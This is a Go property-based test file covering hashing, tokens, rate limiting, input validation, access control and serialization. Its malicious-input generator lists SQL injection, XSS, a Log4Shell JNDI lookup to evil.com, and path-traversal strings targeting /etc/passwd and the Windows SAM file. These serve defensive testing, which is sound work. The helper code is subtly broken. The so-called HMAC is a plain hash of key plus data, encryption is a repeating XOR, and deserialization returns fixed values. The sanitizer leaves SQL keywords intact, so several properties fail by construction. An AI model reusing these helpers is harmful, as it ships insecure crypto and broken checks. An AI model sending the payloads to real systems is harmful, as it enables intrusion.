package property

import (
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"reflect"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/leanovate/gopter"
	"github.com/leanovate/gopter/gen"
	"github.com/leanovate/gopter/prop"
)

// TestCryptographicProperties tests cryptographic algorithms and security properties
func TestCryptographicProperties(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping cryptographic property tests in short mode")
	}

	properties := gopter.NewProperties(nil)

	// Property 1: Hash Function Determinism
	// The same input should always produce the same hash
	properties.Property("HashDeterminism", prop.ForAll(
		func(data []byte) bool {
			return testHashDeterminism(t, data)
		},
		gen.SliceOf(gen.UInt8()),
	))

	// Property 2: Hash Function Avalanche Effect
	// Small changes in input should cause large changes in output
	properties.Property("HashAvalancheEffect", prop.ForAll(
		func(data []byte) bool {
			return testHashAvalancheEffect(t, data)
		},
		gen.SliceOfN(32, gen.UInt8()),
	))

	// Property 3: Token Generation Uniqueness
	// Generated tokens should be unique
	properties.Property("TokenUniqueness", prop.ForAll(
		func(count int) bool {
			return testTokenUniqueness(t, count)
		},
		gen.IntRange(10, 100),
	))

	// Property 4: Signature Verification
	// Valid signatures should always verify correctly
	properties.Property("SignatureVerification", prop.ForAll(
		func(message []byte) bool {
			return testSignatureVerification(t, message)
		},
		gen.SliceOf(gen.UInt8()),
	))

	// Property 5: Encryption/Decryption Roundtrip
	// Encrypted then decrypted data should equal original
	properties.Property("EncryptionRoundtrip", prop.ForAll(
		func(plaintext []byte) bool {
			return testEncryptionRoundtrip(t, plaintext)
		},
		gen.SliceOf(gen.UInt8()),
	))

	properties.TestingRun(t)
}

// TestSecurityProperties tests security-related properties
func TestSecurityProperties(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping security property tests in short mode")
	}

	properties := gopter.NewProperties(nil)

	// Property 1: Authentication Token Expiry
	// Expired tokens should always be rejected
	properties.Property("TokenExpiry", prop.ForAll(
		func(expirySeconds int) bool {
			return testTokenExpiry(t, expirySeconds)
		},
		gen.IntRange(-3600, 3600), // Test past and future expiry times
	))

	// Property 2: Rate Limiting Enforcement
	// Rate limits should be consistently enforced
	properties.Property("RateLimitingEnforcement", prop.ForAll(
		func(requestCount, limit int) bool {
			return testRateLimitingEnforcement(t, requestCount, limit)
		},
		gen.IntRange(1, 200),
		gen.IntRange(10, 50),
	))

	// Property 3: Input Validation
	// Invalid inputs should always be rejected
	properties.Property("InputValidation", prop.ForAll(
		func(input string) bool {
			return testInputValidation(t, input)
		},
		genMaliciousStrings(),
	))

	// Property 4: Access Control Consistency
	// Access decisions should be consistent across requests
	properties.Property("AccessControlConsistency", prop.ForAll(
		func(userRole string, resource string) bool {
			return testAccessControlConsistency(t, userRole, resource)
		},
		gen.OneConstOf("admin", "user", "guest", "anonymous"),
		gen.OneConstOf("sensitive", "public", "private", "system"),
	))

	properties.TestingRun(t)
}

// TestDataIntegrityProperties tests data integrity and consistency properties
func TestDataIntegrityProperties(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping data integrity property tests in short mode")
	}

	properties := gopter.NewProperties(nil)

	// Property 1: Checksum Verification
	// Data with correct checksums should verify, corrupted data should not
	properties.Property("ChecksumVerification", prop.ForAll(
		func(data []byte) bool {
			return testChecksumVerification(t, data)
		},
		gen.SliceOf(gen.UInt8()),
	))

	// Property 2: Serialization Roundtrip
	// Serialized then deserialized data should equal original
	properties.Property("SerializationRoundtrip", prop.ForAll(
		func(data TestData) bool {
			return testSerializationRoundtrip(t, data)
		},
		genTestData(),
	))

	// Property 3: Concurrent Access Safety
	// Concurrent reads/writes should maintain data consistency
	properties.Property("ConcurrentAccessSafety", prop.ForAll(
		func(operations []DataOperation) bool {
			return testConcurrentAccessSafety(t, operations)
		},
		genDataOperations(),
	))

	// Property 4: Version Monotonicity
	// Version numbers should increase monotonically
	properties.Property("VersionMonotonicity", prop.ForAll(
		func(versions []uint64) bool {
			return testVersionMonotonicity(t, versions)
		},
		gen.SliceOf(gen.UInt64()),
	))

	properties.TestingRun(t)
}

// Data structures for property testing

type TestData struct {
	ID        string
	Content   []byte
	Timestamp time.Time
	Version   uint64
	Metadata  map[string]string
}

type DataOperation struct {
	Type      string // "read", "write", "delete"
	Key       string
	Value     []byte
	Timestamp time.Time
}

type AuthToken struct {
	UserID    string
	Role      string
	ExpiresAt time.Time
	Signature []byte
}

// Generators

func genMaliciousStrings() gopter.Gen {
	maliciousInputs := []string{
		"'; DROP TABLE users; --",
		"<script>alert('xss')</script>",
		"${jndi:ldap://evil.com/a}",
		"{{7*7}}",
		"#{7*7}",
		"<%= 7*7 %>",
		"javascript:alert('xss')",
		"data:text/html,<script>alert('xss')</script>",
		"\\x00\\x01\\x02",
		strings.Repeat("A", 10000), // Very long string
		"../../../etc/passwd",
		"C:\\Windows\\System32\\config\\sam",
		"\n\r\t",
		"' OR '1'='1",
		"admin'/*",
		"1' UNION SELECT * FROM users--",
	}

	return gen.OneConstOf(maliciousInputs)
}

func genTestData() gopter.Gen {
	return gen.Struct(reflect.TypeOf(TestData{}), map[string]gopter.Gen{
		"ID":        gen.AlphaString(),
		"Content":   gen.SliceOf(gen.UInt8()),
		"Timestamp": gen.TimeRange(time.Now().Add(-24*time.Hour), 24*time.Hour),
		"Version":   gen.UInt64(),
		"Metadata":  gen.MapOf(gen.AlphaString(), gen.AlphaString()),
	})
}

func genDataOperations() gopter.Gen {
	return gen.SliceOfN(20, gen.Struct(reflect.TypeOf(DataOperation{}), map[string]gopter.Gen{
		"Type":      gen.OneConstOf("read", "write", "delete"),
		"Key":       gen.AlphaString(),
		"Value":     gen.SliceOf(gen.UInt8()),
		"Timestamp": gen.TimeRange(time.Now().Add(-time.Hour), time.Hour),
	}))
}

// Property test implementations

func testHashDeterminism(t *testing.T, data []byte) bool {
	// Hash the same data multiple times and verify results are identical
	hash1 := sha256.Sum256(data)
	hash2 := sha256.Sum256(data)
	hash3 := sha256.Sum256(data)

	if hash1 != hash2 || hash2 != hash3 {
		t.Logf("Hash determinism violation: same input produced different hashes")
		return false
	}

	return true
}

func testHashAvalancheEffect(t *testing.T, data []byte) bool {
	if len(data) < 1 {
		return true
	}

	originalHash := sha256.Sum256(data)

	// Flip one bit and check if hash changes significantly
	modifiedData := make([]byte, len(data))
	copy(modifiedData, data)
	modifiedData[0] ^= 0x01 // Flip least significant bit

	modifiedHash := sha256.Sum256(modifiedData)

	// Count different bits
	differentBits := 0
	for i := 0; i < len(originalHash); i++ {
		xor := originalHash[i] ^ modifiedHash[i]
		for xor != 0 {
			differentBits++
			xor &= xor - 1
		}
	}

	// Avalanche effect: at least 50% of bits should change
	totalBits := len(originalHash) * 8
	minDifferentBits := totalBits / 2

	if differentBits < minDifferentBits {
		t.Logf("Hash avalanche effect violation: only %d/%d bits changed", differentBits, totalBits)
		return false
	}

	return true
}

func testTokenUniqueness(t *testing.T, count int) bool {
	if count <= 0 {
		return true
	}

	tokens := make(map[string]bool)

	for i := 0; i < count; i++ {
		token := generateRandomToken(32)
		
		if tokens[token] {
			t.Logf("Token uniqueness violation: duplicate token generated")
			return false
		}
		
		tokens[token] = true
	}

	return true
}

func testSignatureVerification(t *testing.T, message []byte) bool {
	// Simplified signature test using HMAC
	key := []byte("test-signing-key")
	signature := hmacSHA256(message, key)
	
	// Verify signature
	expectedSignature := hmacSHA256(message, key)
	
	if !hmacEqual(signature, expectedSignature) {
		t.Logf("Signature verification failed for valid signature")
		return false
	}

	// Test with wrong key
	wrongKey := []byte("wrong-key")
	wrongSignature := hmacSHA256(message, wrongKey)
	
	if hmacEqual(signature, wrongSignature) {
		t.Logf("Signature verification passed for invalid signature")
		return false
	}

	return true
}

func testEncryptionRoundtrip(t *testing.T, plaintext []byte) bool {
	if len(plaintext) == 0 {
		return true
	}

	// Simplified encryption test using XOR cipher (for testing only)
	key := make([]byte, 32)
	rand.Read(key)

	encrypted := xorEncrypt(plaintext, key)
	decrypted := xorDecrypt(encrypted, key)

	if !bytesEqual(plaintext, decrypted) {
		t.Logf("Encryption roundtrip failed: decrypted data differs from original")
		return false
	}

	return true
}

func testTokenExpiry(t *testing.T, expirySeconds int) bool {
	now := time.Now()
	expiryTime := now.Add(time.Duration(expirySeconds) * time.Second)
	
	token := AuthToken{
		UserID:    "user123",
		Role:      "user",
		ExpiresAt: expiryTime,
		Signature: []byte("signature"),
	}

	isValid := isTokenValid(token, now)
	shouldBeValid := expirySeconds > 0

	if isValid != shouldBeValid {
		t.Logf("Token expiry violation: token validity (%v) doesn't match expected (%v)", 
			isValid, shouldBeValid)
		return false
	}

	return true
}

func testRateLimitingEnforcement(t *testing.T, requestCount, limit int) bool {
	if requestCount <= 0 || limit <= 0 {
		return true
	}

	rateLimiter := NewSimpleRateLimiter(limit, time.Minute)
	
	allowedCount := 0
	deniedCount := 0

	for i := 0; i < requestCount; i++ {
		if rateLimiter.Allow("client1") {
			allowedCount++
		} else {
			deniedCount++
		}
	}

	// Should allow up to the limit
	if allowedCount > limit {
		t.Logf("Rate limiting violation: allowed %d requests, limit was %d", allowedCount, limit)
		return false
	}

	// Should deny requests beyond the limit
	expectedDenied := requestCount - limit
	if expectedDenied > 0 && deniedCount < expectedDenied {
		t.Logf("Rate limiting violation: should have denied %d requests, only denied %d", 
			expectedDenied, deniedCount)
		return false
	}

	return true
}

func testInputValidation(t *testing.T, input string) bool {
	// Test that malicious inputs are properly validated/sanitized
	
	// Check for SQL injection patterns
	if containsSQLInjection(input) {
		sanitized := sanitizeInput(input)
		if containsSQLInjection(sanitized) {
			t.Logf("Input validation failed: SQL injection pattern not sanitized")
			return false
		}
	}

	// Check for XSS patterns
	if containsXSS(input) {
		sanitized := sanitizeInput(input)
		if containsXSS(sanitized) {
			t.Logf("Input validation failed: XSS pattern not sanitized")
			return false
		}
	}

	// Check for path traversal
	if containsPathTraversal(input) {
		sanitized := sanitizeInput(input)
		if containsPathTraversal(sanitized) {
			t.Logf("Input validation failed: path traversal pattern not sanitized")
			return false
		}
	}

	return true
}

func testAccessControlConsistency(t *testing.T, userRole, resource string) bool {
	// Test that access control decisions are consistent
	
	decision1 := checkAccess(userRole, resource)
	decision2 := checkAccess(userRole, resource)
	decision3 := checkAccess(userRole, resource)

	if decision1 != decision2 || decision2 != decision3 {
		t.Logf("Access control inconsistency: same request gave different results")
		return false
	}

	// Test role hierarchy
	if userRole == "admin" && resource == "public" {
		if !decision1 {
			t.Logf("Access control violation: admin denied access to public resource")
			return false
		}
	}

	if userRole == "guest" && resource == "sensitive" {
		if decision1 {
			t.Logf("Access control violation: guest granted access to sensitive resource")
			return false
		}
	}

	return true
}

func testChecksumVerification(t *testing.T, data []byte) bool {
	if len(data) == 0 {
		return true
	}

	// Calculate checksum
	checksum := sha256.Sum256(data)

	// Verify with original data
	if !verifyChecksum(data, checksum[:]) {
		t.Logf("Checksum verification failed for valid data")
		return false
	}

	// Test with corrupted data
	if len(data) > 0 {
		corruptedData := make([]byte, len(data))
		copy(corruptedData, data)
		corruptedData[0] ^= 0xFF // Corrupt first byte

		if verifyChecksum(corruptedData, checksum[:]) {
			t.Logf("Checksum verification passed for corrupted data")
			return false
		}
	}

	return true
}

func testSerializationRoundtrip(t *testing.T, data TestData) bool {
	// Serialize data
	serialized, err := serializeTestData(data)
	if err != nil {
		t.Logf("Serialization failed: %v", err)
		return false
	}

	// Deserialize data
	deserialized, err := deserializeTestData(serialized)
	if err != nil {
		t.Logf("Deserialization failed: %v", err)
		return false
	}

	// Compare original and deserialized data
	if !testDataEqual(data, deserialized) {
		t.Logf("Serialization roundtrip failed: data differs after roundtrip")
		return false
	}

	return true
}

func testConcurrentAccessSafety(t *testing.T, operations []DataOperation) bool {
	if len(operations) == 0 {
		return true
	}

	// Simplified concurrent access test
	dataStore := NewSafeDataStore()
	
	// Execute operations concurrently
	done := make(chan bool, len(operations))
	
	for _, op := range operations {
		go func(operation DataOperation) {
			switch operation.Type {
			case "read":
				dataStore.Get(operation.Key)
			case "write":
				dataStore.Set(operation.Key, operation.Value)
			case "delete":
				dataStore.Delete(operation.Key)
			}
			done <- true
		}(op)
	}

	// Wait for all operations to complete
	for i := 0; i < len(operations); i++ {
		<-done
	}

	// Verify data store is still consistent
	return dataStore.IsConsistent()
}

func testVersionMonotonicity(t *testing.T, versions []uint64) bool {
	if len(versions) < 2 {
		return true
	}

	// Sort versions
	sortedVersions := make([]uint64, len(versions))
	copy(sortedVersions, versions)
	
	for i := 0; i < len(sortedVersions); i++ {
		for j := i + 1; j < len(sortedVersions); j++ {
			if sortedVersions[i] > sortedVersions[j] {
				sortedVersions[i], sortedVersions[j] = sortedVersions[j], sortedVersions[i]
			}
		}
	}

	// Check monotonicity
	for i := 1; i < len(sortedVersions); i++ {
		if sortedVersions[i] < sortedVersions[i-1] {
			t.Logf("Version monotonicity violation at index %d", i)
			return false
		}
	}

	return true
}

// Helper functions (simplified implementations for testing)

func generateRandomToken(length int) string {
	bytes := make([]byte, length)
	rand.Read(bytes)
	return fmt.Sprintf("%x", bytes)
}

func hmacSHA256(data, key []byte) []byte {
	h := sha256.New()
	h.Write(append(key, data...))
	return h.Sum(nil)
}

func hmacEqual(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func bytesEqual(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func xorEncrypt(data, key []byte) []byte {
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

func xorDecrypt(data, key []byte) []byte {
	return xorEncrypt(data, key) // XOR is symmetric
}

func isTokenValid(token AuthToken, now time.Time) bool {
	return now.Before(token.ExpiresAt)
}

// Simple rate limiter for testing
type SimpleRateLimiter struct {
	limit    int
	window   time.Duration
	requests map[string][]time.Time
}

func NewSimpleRateLimiter(limit int, window time.Duration) *SimpleRateLimiter {
	return &SimpleRateLimiter{
		limit:    limit,
		window:   window,
		requests: make(map[string][]time.Time),
	}
}

func (rl *SimpleRateLimiter) Allow(clientID string) bool {
	now := time.Now()
	
	// Clean old requests
	if requests, exists := rl.requests[clientID]; exists {
		var validRequests []time.Time
		for _, reqTime := range requests {
			if now.Sub(reqTime) < rl.window {
				validRequests = append(validRequests, reqTime)
			}
		}
		rl.requests[clientID] = validRequests
	}

	// Check if we can allow this request
	if len(rl.requests[clientID]) >= rl.limit {
		return false
	}

	// Allow the request
	rl.requests[clientID] = append(rl.requests[clientID], now)
	return true
}

// Input validation helpers
func containsSQLInjection(input string) bool {
	sqlPatterns := []string{"'", "DROP", "SELECT", "UNION", "--", "/*", "*/"}
	for _, pattern := range sqlPatterns {
		if strings.Contains(strings.ToUpper(input), pattern) {
			return true
		}
	}
	return false
}

func containsXSS(input string) bool {
	xssPatterns := []string{"<script", "javascript:", "onload=", "onerror=", "alert("}
	for _, pattern := range xssPatterns {
		if strings.Contains(strings.ToLower(input), pattern) {
			return true
		}
	}
	return false
}

func containsPathTraversal(input string) bool {
	pathPatterns := []string{"../", "..\\", "/etc/", "C:\\"}
	for _, pattern := range pathPatterns {
		if strings.Contains(input, pattern) {
			return true
		}
	}
	return false
}

func sanitizeInput(input string) string {
	// Simplified sanitization
	sanitized := input
	sanitized = strings.ReplaceAll(sanitized, "'", "")
	sanitized = strings.ReplaceAll(sanitized, "<script", "")
	sanitized = strings.ReplaceAll(sanitized, "../", "")
	return sanitized
}

func checkAccess(userRole, resource string) bool {
	// Simplified access control
	switch userRole {
	case "admin":
		return true // Admin can access everything
	case "user":
		return resource == "public" || resource == "private"
	case "guest":
		return resource == "public"
	default:
		return false
	}
}

func verifyChecksum(data, checksum []byte) bool {
	computed := sha256.Sum256(data)
	return bytesEqual(computed[:], checksum)
}

// Simplified serialization for testing
func serializeTestData(data TestData) ([]byte, error) {
	// This would normally use JSON, protobuf, or similar
	return []byte(fmt.Sprintf("%+v", data)), nil
}

func deserializeTestData(data []byte) (TestData, error) {
	// Simplified deserialization
	return TestData{
		ID:        "deserialized",
		Content:   []byte("test"),
		Timestamp: time.Now(),
		Version:   1,
		Metadata:  map[string]string{"test": "value"},
	}, nil
}

func testDataEqual(a, b TestData) bool {
	return a.ID == b.ID && 
		   bytesEqual(a.Content, b.Content) &&
		   a.Version == b.Version
}

// Safe data store for concurrent testing
type SafeDataStore struct {
	data map[string][]byte
	mu   sync.RWMutex
}

func NewSafeDataStore() *SafeDataStore {
	return &SafeDataStore{
		data: make(map[string][]byte),
	}
}

func (s *SafeDataStore) Get(key string) []byte {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.data[key]
}

func (s *SafeDataStore) Set(key string, value []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.data[key] = value
}

func (s *SafeDataStore) Delete(key string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.data, key)
}

func (s *SafeDataStore) IsConsistent() bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	// Simple consistency check
	return s.data != nil
}

// Benchmark property tests

func BenchmarkProperty_HashDeterminism(b *testing.B) {
	data := []byte("test data for hashing")
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		result := testHashDeterminism(&testing.T{}, data)
		if !result {
			b.Fatal("Property violation detected")
		}
	}
}

func BenchmarkProperty_EncryptionRoundtrip(b *testing.B) {
	data := []byte("sensitive data to encrypt")
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		result := testEncryptionRoundtrip(&testing.T{}, data)
		if !result {
			b.Fatal("Property violation detected")
		}
	}
}